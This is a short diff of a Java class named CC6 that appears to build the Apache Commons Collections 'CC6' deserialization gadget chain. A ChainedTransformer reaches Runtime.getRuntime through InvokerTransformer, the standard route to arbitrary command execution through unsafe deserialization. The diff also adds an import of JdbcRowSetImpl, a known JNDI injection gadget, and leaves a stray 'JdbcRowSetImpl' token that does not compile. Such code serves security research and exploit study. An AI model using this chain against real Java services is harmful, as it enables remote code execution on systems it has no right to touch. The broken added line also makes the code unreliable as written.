@@ -1,3 +1,4 @@
+import com.sun.rowset.JdbcRowSetImpl;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -7,6 +8,7 @@ import org.apache.commons.collections.map.LazyMap;
 import sun.misc.BASE64Decoder;
 import sun.misc.BASE64Encoder;
 
+import javax.sql.rowset.JdbcRowSet;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.net.URLEncoder;
@@ -16,6 +18,7 @@ import java.util.Map;
 public class CC6 {
     public static void main(String[] args) throws Exception
     {
+        JdbcRowSetImpl
         ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
